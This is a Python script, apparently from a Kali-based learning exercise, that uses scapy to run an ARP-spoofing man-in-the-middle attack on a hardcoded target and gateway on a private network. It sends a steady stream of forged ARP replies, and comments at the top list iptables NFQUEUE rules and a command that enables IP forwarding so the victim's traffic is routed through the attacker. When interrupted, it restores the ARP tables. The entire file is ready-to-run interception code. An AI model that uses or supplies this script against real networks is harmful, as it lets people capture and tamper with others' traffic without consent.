#!usr/bin/env python

# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# ipatbles --flush
# echo 1 > /proc/sys/net/ipv4/ip_forward

import sys
import time

import scapy.all as scapy

target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"


# op=2 makes this a ARP response instead of a request
# pdst= destination IP
# hwdst = MAC address of target
# psrc = IP address of source (In this case the man-in-the-middle machine)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    ans = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # ans[0] is the first element of the list (the only element)
    # print(ans[0][1].hwsrc)

    return ans[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # Scapy puts the source MAC address as Kali MAC address by default
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)

    # print(packet.show())
    # print(packet.summary())

    scapy.send(packet, count=4, verbose=False)


# packet.show()
# print(packet.summary())

# Have to send both spoof packets continuously so that target ARP tables remain hacked

sent_packets_count = 0
try:

    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2

        # The "," character removes the new-line character AND stores the print statements in buffer and only flushes
        # the buffer on program termination
        print("\r[+] Packets_sent : " + str(sent_packets_count)),
        # Manually flushing the buffer
        sys.stdout.flush()

        # Python 3 (No flushing required)
        # print("\r[+] Packets_sent : " + str(sent_packets_count), end="")

        # delay of 2 sec
        time.sleep(2)

    # Linux by default does not allow port forwarding.
    # So we need to enable it so that the victim`s packet to router and vice-versa
    # through the Kali machine.
    #   --> echo 1 > /proc/sys/net/ipv4/ip_forward
except KeyboardInterrupt:
    # To send an ARP packet from router as source and target machine as destination
    restore(target_ip, gateway_ip)
    # To send an ARP packet from target machine as source and router as destination
    # This resets the ARP tables of both
    restore(gateway_ip, target_ip)
    print("\n[-] Detected CTRL + C........Resetting ARP table.....please wait.!")
